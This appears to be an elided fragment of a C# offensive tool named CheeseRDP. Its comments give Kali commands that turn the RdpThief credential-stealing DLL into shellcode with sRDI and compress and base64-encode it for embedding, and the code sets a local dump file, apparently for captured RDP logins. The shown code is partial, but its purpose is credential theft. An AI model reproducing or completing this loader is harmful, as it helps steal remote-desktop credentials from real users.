...
namespace CheeseRDP
{
    public class Program
    {
        public static void Main(string[] args)
        {
            ...
            // python3 /home/kali/Desktop/sRDI/Python/ConvertToShellcode.py RdpThief.dll
            // cat RdpThief.bin | gzip | gzip | base64 -w0
            ...
            //... bs test- ignore next 2 lines, fyi but not needed to prep above
            ////  hexdump -v -e '1/1 "0x%02x,"' RdpThief.bin | sed 's/.$//'  > RdpThief_bytearray.txt
            ////  grep -o 'x' RdpThief_bytearray.txt  | wc -l  
            
            
            // string dumpFile = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "data.bin");
            string dumpFile = ("c:\\temp\\data.bin");
